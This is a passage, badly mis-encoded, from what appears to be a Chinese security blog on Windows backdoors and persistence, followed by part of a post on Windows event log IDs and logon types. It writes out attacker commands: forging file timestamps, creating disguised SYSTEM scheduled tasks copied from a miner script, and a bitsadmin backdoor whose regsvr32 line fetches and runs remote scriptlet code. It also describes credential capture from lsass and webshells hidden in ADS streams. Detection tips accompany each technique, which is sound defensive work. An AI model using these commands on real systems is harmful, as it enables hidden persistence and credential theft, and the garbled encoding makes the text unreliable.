DLLã€‚è¿™ä¸ªæ—¶å€™æ”»å‡»è€…å¯ä»¥å°†ç²¾å¿ƒæ„é€ çš„ dll åŠ è½½ä¹‹ï¼Œè¿™ä¸ª dll å¯è·å–åˆ° lsass è¿›ç¨‹ä¸­çš„æ˜æ–‡è´¦å·å¯†ç ä¿¡æ¯ã€‚mimikatz(mimilib.dll æˆ– memssp å†…å­˜è¡¥ä¸æ–¹å¼)å®ç°äº†è¿™ä¸€åŠŸèƒ½ï¼Œå¹¶æŠŠè®°å½•åˆ°çš„æ˜æ–‡è´¦å·å¯†ç ä¿¡æ¯ä¿å­˜åœ¨æœ¬åœ°ã€‚ è¯¦è§æ–‡ç«  Persistence â€“ Security Support Provider æ–‡ä»¶éšè—attrib å‘½ä»¤éšè— windows è‡ªå¸¦å‘½ä»¤è¡Œå·¥å…· attrib ç”¨æ¥æ˜¾ç¤ºæˆ–æ›´æ”¹æ–‡ä»¶å±æ€§ã€‚ ä¼˜ç‚¹:ç®€å• ç¼ºç‚¹:æš‚æ—  æ’æŸ¥:ä½¿ç”¨ attrib å‘½ä»¤æˆ–è€… D ç›¾ ä½¿ç”¨ ADS æµéšè— webshell ADS å³ NTFS æ–‡ä»¶æµ ä½¿ç”¨ ADS æµéšè— webshell,ç›®å‰å¯è¿‡ D ç›¾æ‰«æ,æ³¨æ„ ADS çš„ä¸€å¥è¯æœ¨é©¬æ— æ³•ç›´æ¥è¿æ¥ï¼Œå¯ä»¥ä½¿ç”¨ php çš„ include å»åŒ…å«æ‰§è¡Œ æ–‡ç« å‚è€ƒï¼š åˆ©ç”¨ ADS éšè— webshell æ–‡ç« å‚è€ƒï¼š Windows ADS åœ¨æ¸—é€æµ‹è¯•ä¸­çš„å¦™ç”¨ æ­¤å¤–åº”è¯¥æ³¨æ„ä¿®æ”¹æ–‡ä»¶çš„ timestampï¼Œå¯ä½¿ç”¨å¦‚ä¸‹çš„[[powershell]]å‘½ä»¤æˆ–è€…ä½¿ç”¨ NewFileTime å·¥å…· 123456$(Get-Item ).creationtime=$(Get-Date &quot;mm/dd/yyyy hh:mm am/pm&quot;)$(Get-Item ).lastaccesstime=$(Get-Date &quot;mm/dd/yyyy hh:mm am/pm&quot;)$(Get-Item ).lastwritetime=$(Get-Date &quot;mm/dd/yyyy hh:mm am/pm&quot;)exampleï¼šSet the last-access time for a file aaa.csv to the current time: $(Get-Item aaa.csv).lastwritetime=$(Get-Date)Set the creation time of a file foo.txt to November 24, 2015, at 6:00am: $(Get-Item foo.txt).creationtime=$(Get-Date &quot;11/24/2015 06:00 am&quot;) ä¼˜ç‚¹ï¼šè¾ƒéš¾æ£€æµ‹ ç¼ºç‚¹ï¼šæš‚æ—  æ’æŸ¥ï¼š dir /r è®¡åˆ’ä»»åŠ¡ schtasks å’Œ at å‘½ä»¤ï¼Œä¾‹å¦‚ä¸‹é¢çš„å‘½ä»¤ 123456789101112#from https://github.com/diggles9991/MG/blob/master/XMR/Hook.ps1#L12# Update scheduled Start TaskSCHTASKS /Delete /tn &quot;AdobeReaderUpdate&quot; /fSCHTASKS /Create /RU &quot;SYSTEM&quot; /tn &quot;AdobeReaderUpdate&quot; /sc Weekly /d * /st 18:00:00 /tr &quot;powershell.exe C:\\Windows\\System32\\drivers\\en-US\\etc\\Line.ps1&quot;# Update scheduled End Task# SCHTASKS /Delete /tn &quot;AdobeReaderUpdateEnd&quot; /fSCHTASKS /Create /RU &quot;SYSTEM&quot; /tn &quot;AdobeReaderUpdateEnd&quot; /sc Weekly /d MON,TUE,WED,THU,FRI /st 06:00:00 /tr &quot;powershell.exe Stop-Process -Name $processname&quot;# At commandat 1:00AM /Every:Saturday My_BackUp.bat åœ¨æ¯ä¸ªSaturdayçš„æ—©ä¸Š1:00ç‚¹ï¼Œå®šæ—¶å¯åŠ¨My_BackUp.batæ‰¹å¤„ç†æ–‡ä»¶ã€‚ ä¼˜ç‚¹ï¼šç®€å• ç¼ºç‚¹ï¼šæ˜“è¢«æ£€æµ‹ æ’æŸ¥ï¼š schtasks /query å‘½ä»¤è¿›è¡ŒæŸ¥è¯¢æˆ–è€…é€šè¿‡è®¡ç®—æœºçš„ç®¡ç†æŸ¥çœ‹ï¼Œæ³¨æ„åœ¨ windows çš„ä¸­æ–‡ç‰ˆç³»ç»Ÿä¸­ï¼Œschtasks å‘½ä»¤éœ€è¦åˆ‡æ¢å­—ç¬¦ä¸ºç¾å›½è‹±è¯­æ ¼å¼ï¼Œä½¿ç”¨å‘½ä»¤ chcp 437ï¼Œæˆ–è€…ç›´æ¥å·¥å…· autorunsã€‚ å¼€æœºå¯åŠ¨é¡¹1234HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunHKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnceHKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Runç­‰ ä¼˜ç‚¹ï¼šé‡å¯æƒé™ç»´æŒ ç¼ºç‚¹ï¼šä¸€èˆ¬æ€è½¯å‡ä¼šæ‹¦æˆª æ’æŸ¥ï¼šä¸€ä¸ªä¸€ä¸ªæ‰‹å·¥æŸ¥å¤ªéº»çƒ¦ï¼Œå»ºè®®ç›´æ¥ä¸Š autorunsã€‚ 20191022 æ›´æ–° åˆ©ç”¨ windows åŸç”Ÿ API å»åˆ›å»º regedit.exe ä¸èƒ½å±•ç¤ºå’Œå¯¼å‡ºçš„é”®å€¼å¯¹ è¯¦è§æ–‡ç«  invisible Reg Values ,ç¼ºç‚¹åªæ˜¯é€šè¿‡regedit.exeæŸ¥çœ‹æ—¶å€™æœ‰éšè—æ•ˆæœï¼Œé€šè¿‡autorunsç­‰å·¥å…·è¿˜æ˜¯ä¼šè¢«å‘ç°ã€‚ æœåŠ¡1sc create [ServerName] binPath= BinaryPathName ä¼˜ç‚¹ï¼šé‡å¯æƒé™ç»´æŒ ç¼ºç‚¹ï¼šä¸€èˆ¬æ€è½¯ä¼šæ‹¦æˆª æ’æŸ¥ï¼šå·¥å…· autoruns waitfor.exe ä¸æ”¯æŒè‡ªå¯åŠ¨ï¼Œä½†å¯è¿œç¨‹ä¸»åŠ¨æ¿€æ´»ï¼Œåå°è¿›ç¨‹æ˜¾ç¤ºä¸º waitfor.exe è¯¦ç»†å‚è€ƒ ä¼˜ç‚¹ï¼šè¿œç¨‹ä¸»åŠ¨æ¿€æ´» ç¼ºç‚¹ï¼šæœ‰ waitfor è¿›ç¨‹ æ’æŸ¥ï¼šé€šè¿‡ Process Explorer å·¥å…·æŸ¥çœ‹æ˜¯å¦æœ‰ waitfor.exe è¿›ç¨‹ï¼Œå¹¶è¿›ä¸€æ­¥æŸ¥çœ‹å¯åŠ¨å‚æ•°ç­‰ã€‚ bitsadmin åé—¨ Bitsadmin ä» win7 ä¹‹åæ“ä½œç³»ç»Ÿå°±é»˜è®¤åŒ…å«ï¼Œå¯ä»¥ç”¨æ¥åˆ›å»ºä¸Šä¼ æˆ–è€…ä¸‹è½½ä»»åŠ¡ã€‚Bistadmin å¯ä»¥æŒ‡å®šä¸‹è½½æˆåŠŸä¹‹åè¦è¿›è¡Œä»€ä¹ˆå‘½ä»¤ã€‚åé—¨å°±æ˜¯åˆ©ç”¨çš„ä¸‹è½½æˆåŠŸä¹‹åè¿›è¡Œå‘½ä»¤æ‰§è¡Œã€‚ 12345678#åˆ›å»ºä¸€ä¸ªä¸‹è½½ä»»åŠ¡ï¼šbitsadmin /create backdoor#æ·»åŠ æ–‡æ¡£ï¼šbitsadmin /addfile backdoor %comspec% %temp%\\cmd.exe#è®¾ç½®ä¸‹è½½æˆåŠŸä¹‹åè¦æ‰§è¡Œçš„å‘½ä»¤ï¼šbitsadmin.exe /SetNotifyCmdLine backdoor regsvr32.exe &quot;/u /s /i:https://raw.githubusercontent.com/3gstudent/SCTPersistence/master/calc.sct scrobj.dll&quot;#æ‰§è¡Œä»»åŠ¡ï¼šbitsadmin /Resume backdoor å¯ä»¥å‚è€ƒè¿™ç¯‡æ–‡ç«  bitsadmin-backdoor-æƒé™ç»´æŒåé—¨ ä¼˜ç‚¹ï¼šç³»ç»Ÿè‡ªå¸¦æ— éœ€ä¸Šä¼  ç¼ºç‚¹ï¼šå…æ€æ•ˆæœä¸€èˆ¬ æ’æŸ¥ï¼šbitsadmin /list /verbose WMI åé—¨(é‡ç‚¹!) åœ¨ 2015 å¹´çš„ blackhat å¤§ä¼šä¸Š Matt Graeber ä»‹ç»äº†ä¸€ç§æ— æ–‡ä»¶åé—¨å°±æ˜¯ç”¨çš„ wmiã€‚ æ›´å¤šå¯ä»¥å‚è€ƒ åœ¨ empire ä¸­æœ‰ç›¸åº”çš„ moduleï¼Œä½œè€…å‚è€ƒä½¿ç”¨äº† Powersploit é‡Œé¢çš„ä»£ç ã€‚ åé—¨åœ¨ç³»ç»Ÿé‡å¯äº”åˆ†é’Ÿä¹‹å†…è§¦å‘ä¸”æ˜¯ system æƒé™ã€‚ ä¼˜ç‚¹ï¼šæ— æ–‡ä»¶ï¼Œç›¸å¯¹æ¥è¯´éš¾ä»¥æ’æŸ¥ ç¼ºç‚¹ï¼šæš‚æ—  æ’æŸ¥ï¼šå·¥å…· autoruns COM åŠ«æŒ å¯ä»¥å‚è€ƒæ–‡ç«  æ‰“å¼€æ–‡ä»¶å¤¹å°±è¿è¡Œï¼ŸCOM åŠ«æŒåˆ©ç”¨æ–°å§¿åŠ¿ åˆ©ç”¨ CLR å®ç°ä¸€ç§æ— éœ€ç®¡ç†å‘˜æƒé™çš„åé—¨ â€œä¸»åŠ¨å‹â€åé—¨ï¼ŒWMIæ·»åŠ ç¯å¢ƒå˜é‡éœ€è¦é‡å¯ç³»ç»Ÿç”Ÿæ•ˆ ä¼˜ç‚¹:éšè—æ€§è¾ƒå¥½,autoruns æŸ¥ä¸åˆ° ç¼ºç‚¹:æš‚æ—  æ’æŸ¥:æ£€æŸ¥ç¯å¢ƒå˜é‡å’Œæ³¨å†Œè¡¨é”®å€¼ meterpreter æƒé™ç»´æŒ meterpreter ä¸­çš„æƒé™ç»´æŒæŠ€æœ¯æœ‰ä¸¤ç§ï¼Œä¸€ç§æ˜¯ metsvc çš„åé—¨(æœåŠ¡åé—¨)ï¼Œå¦å¤–ä¸€ç§æ˜¯ persistence(æ³¨å†Œè¡¨åé—¨) metsvc æ˜¯å¼€æœºè‡ªå¯åŠ¨çš„æœåŠ¡å‹åé—¨ metsvc ä»£ç  persistence æ¨¡å—æ˜¯å…ˆä¸Šä¼  vbs è„šæœ¬å¹¶æ‰§è¡Œ vbs è„šæœ¬ä¿®æ”¹æ³¨å†Œè¡¨ HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run ä»è€Œå®Œæˆè‡ªå¯åŠ¨ã€‚ persistence ä»£ç  ä¼˜ç‚¹ï¼šå¼€æœºè‡ªå¯åŠ¨ ç¼ºç‚¹ï¼šå®¹æ˜“è¢«æ€è½¯æ€ æ’æŸ¥ï¼šåƒæ˜¯è¿™ç§åé—¨ä½¿ç”¨ autoruns åŸºæœ¬éƒ½å¯ä»¥æ’æŸ¥å‡ºæ¥ã€‚ Empire persistence æ¨¡å—(é‡ç‚¹!!) Empire æ˜¯ä¸€æ¬¾åŠŸèƒ½éå¸¸å¼ºå¤§çš„åæ¸—é€æ”»å‡»æ¡†æ¶ã€‚å…¶ä¸­çš„ persistence æ¨¡å—æä¾›äº†ä¸€ç³»åˆ—æƒé™ç»´æŒæ–¹æ³•ã€‚ å·¥å…·è¿˜æŠŠæƒé™ç»´æŒåˆ†ä¸ºäº†å››å¤§ç±»ï¼Œuserland(æ™®é€šæƒé™)ã€elevated(éœ€è¦é«˜æƒé™)ã€powerbreach(å†…å­˜æƒé™ç»´æŒï¼Œé‡å¯åå¤±æ•ˆ)ã€miscellaneous(å…¶å®ƒ)ã€‚ é€šè¿‡ info å‘½ä»¤æŸ¥çœ‹ä½¿ç”¨æ–¹æ³• æ›´å¤šå¯ä»¥å‚è€ƒæ–‡ç«  ä¼˜ç‚¹:åŸºæœ¬é›†æˆäº†å¤§éƒ¨åˆ†çš„æƒé™ç»´æŒæ–¹æ³• ç¼ºç‚¹ï¼šæš‚æ—  æ’æŸ¥ï¼šå·¥å…· autoruns è¿›ç¨‹æ³¨å…¥(é‡ç‚¹!!) å‡†ç¡®æ¥è¯´è¿›ç¨‹æ³¨å…¥ä¸æ˜¯åé—¨æŠ€æœ¯æˆ–è€…æƒé™ç»´æŒæŠ€æœ¯ï¼Œè€Œæ˜¯ä¸€ç§éšè—æŠ€æœ¯ï¼Œè¿™é‡Œç®€å•è¯´ä¸€ä¸‹ empire çš„ psinjectã€cobaltstrike çš„ inject å’Œ meterpreter ä¸­çš„ migrate è¿›ç¨‹æ³¨å…¥ï¼Œä¸€èˆ¬å¯ä»¥æ³¨å…¥åˆ°åƒæ˜¯ lsass æˆ–è€… explorer è¿™æ ·çš„è¿›ç¨‹å½“ä¸­ï¼Œç›¸å¯¹æ¯”è¾ƒéšè”½ï¼Œè¾ƒéš¾æ’æŸ¥ã€‚ ä½¿ç”¨æ–¹æ³•è¿™é‡Œå°±ä¸ä»‹ç»äº†ï¼Œä¸»è¦è¯´ä¸€ä¸‹å¦‚ä½• huntingã€‚è¿™ç¯‡æ–‡ç«  TALES OF A BLUE TEAMER: DETECTING POWERSHELL EMPIRE SHENANIGANS WITH SYSINTERNALS é‡Œé¢ä»‹ç»äº†å¦‚ä½•hunting empireæ–¹æ³•ï¼Œempireæœ‰ä¸€äº›evasion detectionæœºåˆ¶ï¼Œå…¶ä¸­çš„ç½‘ç»œè¿æ¥æ—¶é—´è®¾ç½®èƒ½æœ‰æ•ˆé¿å¼€å¸¸è§ä¸»æœºæµé‡æ£€æµ‹å·¥å…·(åŒ…æ‹¬netstatã€tcpview)çš„æ£€æµ‹ï¼Œæ–‡ç« ä¸­ä¹Ÿä»‹ç»äº†ä½¿ç”¨process monitoræ˜¯æœ€å¿«ä¹Ÿæ˜¯æœ€æœ‰æ•ˆçš„æ–¹æ³•ã€‚ ä½†æ˜¯åœ¨ hunting è¿›ç¨‹æ³¨å…¥çš„æ—¶å€™ï¼Œå¹¶æ²¡æœ‰åƒæ–‡ç« ä¸­è¯´çš„æŸ¥æ‰¾åˆ°ä»¥èµ·å§‹åœ°å€ä¸º 0x0 çš„çº¿ç¨‹ï¼Œä½†ä¼šå‘ç°è¢«æ³¨å…¥çš„è¿›ç¨‹å±æ€§é‡Œä¼šæœ‰.NET Assemblies å’Œ.NET Performance ä¸¤ä¸ªèœå•ã€‚å¦‚ä¸‹å›¾æ‰€ç¤º ä¼˜ç‚¹ï¼šè¾ƒéš¾æ’æŸ¥ ç¼ºç‚¹ï¼šæš‚æ—  æ’æŸ¥ï¼šå·¥å…· process explorer ã€process monitor BDF åé—¨ BDF(The Backdoor Factory)å¯ç”¨æ¥å‘å¯æ‰§è¡Œæ–‡ä»¶æ¤å…¥åé—¨ï¼Œä¿®æ”¹ç¨‹åºæ‰§è¡Œæµç¨‹ï¼Œæ‰§è¡Œæ·»åŠ çš„ payloadã€‚ å‚è€ƒ åˆ©ç”¨ BDF å‘ EXE æ–‡ä»¶æ¤å…¥åé—¨ Kali Linux: Backdoor-factory tool å½“æ‹¿åˆ°å†…ç½‘æƒé™ä¹‹åï¼Œå¯ä»¥åœ¨å­˜æ”¾å…¬å…±ä¸‹è½½çš„æœåŠ¡å™¨ä¸Šç»™æŸä¸ªè½¯ä»¶åŠ ä¸Šè¿™æ ·çš„åé—¨ã€‚ IIS æ¨¡å—åé—¨æ‰‹æŠŠæ‰‹å¸¦ä½ å¼€å‘ä¸€æ¬¾ IIS æ¨¡å—åé—¨ [[åŸŸ]]ç¯å¢ƒåé—¨ åŸŸå†…é…ç½® ACL åé—¨åŠæ£€æµ‹æ¸…ç† PasswordchangeNotify åŸŸåé—¨ç›¸å…³æ–‡ç«  other é™¤äº†ä»¥ä¸Šçš„å‡ ç§åé—¨å’Œæƒé™ç»´æŒæŠ€æœ¯å¤–è¿˜æœ‰åƒæ˜¯ dll åŠ«æŒã€ä¸€äº›è½¯ä»¶çš„æ’ä»¶åé—¨ã€office åé—¨ç­‰ã€‚","link":"/2021/05/12/Windows%E5%90%8E%E9%97%A8%E5%8F%8A%E6%8E%92%E6%9F%A5/"},{"title":"Windows ç³»ç»Ÿäº‹ä»¶ç±»å‹","text":"ç®€ä»‹ é—²èŠ Windows ç³»ç»Ÿæ—¥å¿— æ—©æœŸç‰ˆæœ¬ä¸­ Windows æ—¥å¿—åªæœ‰ï¼Œåº”ç”¨ç¨‹åºï¼Œå®‰å…¨ï¼Œç³»ç»Ÿå’Œ Setupï¼Œæ–°çš„ç‰ˆæœ¬ä¸­å¢åŠ äº†è®¾ç½®åŠè½¬å‘äº‹ä»¶æ—¥å¿—ï¼ˆé»˜è®¤ç¦ç”¨ï¼‰ã€‚ ç³»ç»Ÿå†…ç½®çš„ä¸‰ä¸ªæ ¸å¿ƒæ—¥å¿—æ–‡ä»¶ï¼ˆSystemï¼ŒSecurity å’Œ Applicationï¼‰é»˜è®¤å¤§å°å‡ä¸º 20480KBï¼ˆ20MBï¼‰ï¼Œè®°å½•äº‹ä»¶æ•°æ®è¶…è¿‡ 20MB æ—¶ï¼Œé»˜è®¤ç³»ç»Ÿå°†ä¼˜å…ˆè¦†ç›–è¿‡æœŸçš„æ—¥å¿—è®°å½•ã€‚å…¶å®ƒåº”ç”¨ç¨‹åºåŠæœåŠ¡æ—¥å¿—é»˜è®¤æœ€å¤§ä¸º 1024KBï¼Œè¶…è¿‡æœ€å¤§é™åˆ¶ä¹Ÿä¼˜å…ˆè¦†ç›–è¿‡æœŸçš„æ—¥å¿—è®°å½•ã€‚ ç™»å½•æˆåŠŸä¸ä»£è¡¨ä¸€å®šæ˜¯ rdp ç™»å½•ï¼Œæ‰€æœ‰äº‹ä»¶çš„ç™»å½•ç±»å‹éƒ½æ˜¯ 4624 æ–¹æ³•è®º é€šå¸¸æ˜¯é€šè¿‡åœ¨äº‹ä»¶æŸ¥çœ‹å™¨ä¸­ï¼šç­›é€‰å½“å‰æ—¥å¿—-&gt;äº‹ä»¶ ID å†™ 4624 ç­‰ Windows äº‹ä»¶ç±»å‹ï¼ˆçº§åˆ«ï¼‰ çº§åˆ« å«ä¹‰ ä¿¡æ¯ï¼ˆInformationï¼‰ ä¿¡æ¯äº‹ä»¶æŒ‡åº”ç”¨ç¨‹åºã€é©±åŠ¨ç¨‹åºæˆ–æœåŠ¡çš„æˆåŠŸæ“ä½œçš„äº‹ä»¶ã€‚ è­¦å‘Šï¼ˆWarningï¼‰ è­¦å‘Šäº‹ä»¶æŒ‡ä¸æ˜¯ç›´æ¥çš„ã€ä¸»è¦çš„ï¼Œä½†æ˜¯ä¼šå¯¼è‡´å°†æ¥é—®é¢˜å‘ç”Ÿçš„é—®é¢˜ã€‚ä¾‹å¦‚ï¼Œå½“ç£ç›˜ç©ºé—´ä¸è¶³æˆ–æœªæ‰¾åˆ°æ‰“å°æœºæ—¶ï¼Œéƒ½ä¼šè®°å½•ä¸€ä¸ªâ€œè­¦å‘Šâ€äº‹ä»¶ã€‚ é”™è¯¯ï¼ˆErrorï¼‰ é”™è¯¯äº‹ä»¶æŒ‡ç”¨æˆ·åº”è¯¥çŸ¥é“çš„é‡è¦çš„é—®é¢˜ã€‚é”™è¯¯äº‹ä»¶é€šå¸¸æŒ‡åŠŸèƒ½å’Œæ•°æ®çš„ä¸¢å¤±ã€‚ä¾‹å¦‚,å¦‚æœä¸€ä¸ªæœåŠ¡ä¸èƒ½ä½œä¸ºç³»ç»Ÿå¼•å¯¼è¢«åŠ è½½ï¼Œé‚£ä¹ˆå®ƒä¼šäº§ç”Ÿä¸€ä¸ªé”™è¯¯äº‹ä»¶ã€‚ æˆåŠŸå®¡æ ¸ï¼ˆSuccess auditï¼‰ æˆåŠŸçš„å®¡æ ¸å®‰å…¨è®¿é—®å°è¯•ï¼Œä¸»è¦æ˜¯æŒ‡å®‰å…¨æ€§æ—¥å¿—ï¼Œè¿™é‡Œè®°å½•ç€ç”¨æˆ·ç™»å½•/æ³¨é”€ã€å¯¹è±¡è®¿é—®ã€ç‰¹æƒä½¿ç”¨ã€è´¦æˆ·ç®¡ç†ã€ç­–ç•¥æ›´æ”¹ã€è¯¦ç»†è·Ÿè¸ªã€ç›®å½•æœåŠ¡è®¿é—®ã€è´¦æˆ·ç™»å½•ç­‰äº‹ä»¶ï¼Œä¾‹å¦‚æ‰€æœ‰çš„æˆåŠŸç™»å½•ç³»ç»Ÿéƒ½ä¼šè¢«è®°å½•ä¸ºâ€œ æˆåŠŸå®¡æ ¸â€äº‹ä»¶ã€‚ å¤±è´¥å®¡æ ¸ï¼ˆFailure auditï¼‰ å¤±è´¥çš„å®¡æ ¸å®‰å…¨ç™»å½•å°è¯•ï¼Œä¾‹å¦‚ç”¨æˆ·è¯•å›¾è®¿é—®ç½‘ç»œé©±åŠ¨å™¨å¤±è´¥ï¼Œåˆ™è¯¥å°è¯•ä¼šè¢«ä½œä¸ºå¤±è´¥å®¡æ ¸äº‹ä»¶è®°å½•ä¸‹æ¥ã€‚ äº‹ä»¶æ—¥å¿—å­˜å‚¨ä½ç½® ç±»å‹ äº‹ä»¶ç±»å‹ æè¿° æ–‡ä»¶å Windows æ—¥å¿— ç³»ç»Ÿ åŒ…å«ç³»ç»Ÿè¿›ç¨‹ï¼Œè®¾å¤‡ç£ç›˜æ´»åŠ¨ç­‰ã€‚äº‹ä»¶è®°å½•äº†è®¾å¤‡é©±åŠ¨æ— æ³•æ­£å¸¸å¯åŠ¨æˆ–åœæ­¢ï¼Œç¡¬ä»¶å¤±è´¥ï¼Œé‡å¤ IP åœ°å€ï¼Œç³»ç»Ÿè¿›ç¨‹çš„å¯åŠ¨ï¼Œåœæ­¢åŠæš‚åœç­‰è¡Œä¸ºã€‚ System.evtx å®‰å…¨ åŒ…å«å®‰å…¨æ€§ç›¸å…³çš„äº‹ä»¶ï¼Œå¦‚ç”¨æˆ·æƒé™å˜æ›´ï¼Œç™»å½•åŠæ³¨é”€ï¼Œæ–‡ä»¶åŠæ–‡ä»¶å¤¹è®¿é—®ï¼Œæ‰“å°ç­‰ä¿¡æ¯ã€‚ Security.evtx åº”ç”¨ç¨‹åº åŒ…å«æ“ä½œç³»ç»Ÿå®‰è£…çš„åº”ç”¨ç¨‹åºè½¯ä»¶ç›¸å…³çš„äº‹ä»¶ã€‚äº‹ä»¶åŒ…æ‹¬äº†é”™è¯¯ã€è­¦å‘ŠåŠä»»ä½•åº”ç”¨ç¨‹åºéœ€è¦æŠ¥å‘Šçš„ä¿¡æ¯ï¼Œåº”ç”¨ç¨‹åºå¼€å‘äººå‘˜å¯ä»¥å†³å®šè®°å½•å“ªäº›ä¿¡æ¯ã€‚ Application.evtx ç±»å‹ äº‹ä»¶ç±»å‹ æè¿° æ–‡ä»¶å åº”ç”¨ç¨‹åºåŠæœåŠ¡æ—¥å¿— Microsoft Microsoft æ–‡ä»¶å¤¹ä¸‹åŒ…å«äº† 200 å¤šä¸ªå¾®è½¯å†…ç½®çš„äº‹ä»¶æ—¥å¿—åˆ†ç±»ï¼Œåªæœ‰éƒ¨åˆ†ç±»å‹é»˜è®¤å¯ç”¨è®°å½•åŠŸèƒ½ï¼Œå¦‚è¿œç¨‹æ¡Œé¢å®¢æˆ·ç«¯è¿æ¥ã€æ— çº¿ç½‘ç»œã€æœ‰çº¿ç½‘è·¯ã€è®¾å¤‡å®‰è£…ç­‰ç›¸å…³æ—¥å¿— è¯¦è§æ—¥å¿—å­˜å‚¨ç›®å½•å¯¹åº”æ–‡ä»¶ Windows PowerShell Windows è‡ªå¸¦çš„ PowerShell åº”ç”¨çš„æ—¥å¿—ä¿¡æ¯ã€‚ Windows PowerShell.evtx Internet Explorer IE æµè§ˆå™¨åº”ç”¨ç¨‹åºçš„æ—¥å¿—ä¿¡æ¯ï¼Œé»˜è®¤æœªå¯ç”¨ï¼Œéœ€è¦é€šè¿‡ç»„ç­–ç•¥è¿›è¡Œé…ç½®ã€‚ Internet Explorer.evtx %SystemRoot% ä¸ºç³»ç»Ÿç¯å¢ƒå˜é‡ï¼Œé»˜è®¤å€¼åœ¨ C:/WINDOWS äº‹ä»¶ ID åŠå«ä¹‰ äº‹ä»¶ ID è¯´æ˜ 1102 æ¸…ç†å®¡è®¡æ—¥å¿— 4624 è´¦å·æˆåŠŸç™»å½• 4625 è´¦å·ç™»å½•å¤±è´¥ 4768 Kerberos èº«ä»½éªŒè¯ï¼ˆTGT è¯·æ±‚ï¼‰ 4769 Kerberos æœåŠ¡ç¥¨è¯è¯·æ±‚ 4776 NTLM èº«ä»½éªŒè¯ 4672 æˆäºˆç‰¹æ®Šæƒé™ 4720 åˆ›å»ºç”¨æˆ· 4726 åˆ é™¤ç”¨æˆ· 4728 å°†æˆå‘˜æ·»åŠ åˆ°å¯ç”¨å®‰å…¨ç»„çš„å…¨å±€ç»„ä¸­ 4729 å°†æˆå‘˜ä»å®‰å…¨çš„å…¨å±€ç»„ä¸­ç§»é™¤ 4732 å°†æˆå‘˜æ·»åŠ åˆ°å¯ç”¨å®‰å…¨çš„æœ¬åœ°ç»„ä¸­ 4733 å°†æˆå‘˜ä»å¯ç”¨å®‰å…¨çš„æœ¬åœ°ç»„ä¸­ç§»é™¤ 4756 å°†æˆå‘˜æ·»åŠ åˆ°å¯ç”¨å®‰å…¨ç»„çš„é€šç”¨ç»„ä¸­ 4757 å°†æˆå‘˜ä»å¯ç”¨å®‰å…¨ç»„çš„é€šç”¨ç»„ä¸­ç§»é™¤ 4719 ç³»ç»Ÿå®¡è®¡ç­–ç•¥ä¿®æ”¹ 104 æ‰€æœ‰å®¡è®¡æ—¥å¿—æ¸…é™¤äº‹ä»¶ 4727ã€4737ã€4739ã€4762 è¡¨ç¤ºå½“ç”¨æˆ·ç»„å‘ç”Ÿæ·»åŠ ã€åˆ é™¤æ—¶æˆ–ç»„å†…æ·»åŠ æˆå‘˜æ—¶ç”Ÿæˆè¯¥äº‹ä»¶ 4688 è¡¨ç¤ºåˆ›å»ºè¿›ç¨‹ï¼Œæœ¬åœ°æ‰§è¡Œ exe 4741 è®¡ç®—æœºè´¦æˆ·å·²åˆ›å»º 4742 è®¡ç®—æœºè´¦æˆ·å·²æ›´æ”¹ 4723 å°è¯•æ›´æ”¹è´¦æˆ·å¯†ç  4724 å°è¯•é‡ç½®è´¦æˆ·å¯†ç  4726 ç”¨æˆ·è´¦æˆ·å·²è¢«åˆ é™¤ 4672 ä½¿ç”¨ç®¡ç†å‘˜ï¼ˆæˆ–è€…è¶…çº§ç”¨æˆ·ï¼‰è¿›è¡Œç™»å½• äº”ç§äº‹ä»¶ç±»å‹ä¸­ï¼Œæœ€ä¸ºé‡è¦çš„å°±æ˜¯æˆåŠŸå®¡æ ¸ï¼ˆSuccess Auditï¼‰ï¼Œæ‰€æœ‰ç™»å½•æˆåŠŸéƒ½ä¼šè¢«æ ‡æ³¨ä¸ºæˆåŠŸå®¡æ ¸ ç™»å½•ç±»å‹ æè¿° è¯´æ˜ 2 äº¤äº’å¼ç™»å½•ï¼ˆInteractiveï¼‰ ç”¨æˆ·åœ¨æœ¬åœ°è¿›è¡Œç™»å½• 3 ç½‘ç»œï¼ˆNetworkï¼‰ å¸¸è§çš„æƒ…å†µå°±æ˜¯è¿æ¥åˆ°å…±äº«æ–‡ä»¶å¤¹æˆ–å…±äº«æ‰“å°æœºæ—¶ï¼Œå¦‚ SMB çˆ†ç ´â€”â€”è •è™«ç—…æ¯’ 4 æ‰¹å¤„ç†ï¼ˆBatchï¼‰ é€šå¸¸è¡¨ç¤ºæŸè®¡åˆ’ä»»åŠ¡æ­£åœ¨å¯åŠ¨ 5 æœåŠ¡ï¼ˆserviceï¼‰ æ¯ç§æœåŠ¡éƒ½è¢«é…ç½®åœ¨æŸä¸ªç‰¹å®šçš„ç”¨æˆ·è´¦å·ä¸‹è¿è¡Œ 6 ä¸æ”¯æŒ 7 è§£é”ï¼ˆUnlockï¼‰ å±ä¿è§£é”ã€‚ 8 ç½‘ç»œæ˜æ–‡ï¼ˆNetworkCleartextï¼‰ ç™»å½•çš„å¯†ç åœ¨ç½‘ç»œä¸Šæ˜¯é€šè¿‡æ˜æ–‡ä¼ è¾“çš„ï¼Œå¦‚ FTP 9 æ–°å‡­è¯ï¼ˆNewCredentialsï¼‰ ä½¿ç”¨å¸¦/Netonly å‚æ•°çš„ RUNAS å‘½ä»¤è¿è¡Œä¸€ä¸ªç¨‹åº 10 è¿œç¨‹äº¤äº’ï¼ˆRemoteInteractiveï¼‰ é€šè¿‡ç»ˆç«¯æœåŠ¡ã€è¿œç¨‹æ¡Œé¢æˆ–è¿œç¨‹ååŠ©è®¿é—®è®¡ç®—æœºï¼Œå¦‚ RDP çˆ†ç ´â€”â€”å‹’ç´¢ç—…æ¯’ 11 ç¼“å­˜äº¤äº’ï¼ˆCachedInteractiveï¼‰ ä»¥ä¸€ä¸ªåŸŸç”¨æˆ·ç™»å½•è€Œåˆæ²¡æœ‰åŸŸæ§åˆ¶å™¨å¯ç”¨ æ–‡ä»¶å…±äº« IDï¼ˆç«¯å£ 445ï¼‰æ–‡ä»¶å…±äº«å¯¹åº”äº‹ä»¶ ID ID å«ä¹‰ 5140 è®¿é—®äº†ç½‘ç»œå…±äº«å¯¹è±¡ 5141 ç›®å½•æœåŠ¡å¯¹è±¡å·²åˆ é™¤ 5142 æ·»åŠ äº†ç½‘ç»œå…±äº«å¯¹è±¡ 5143 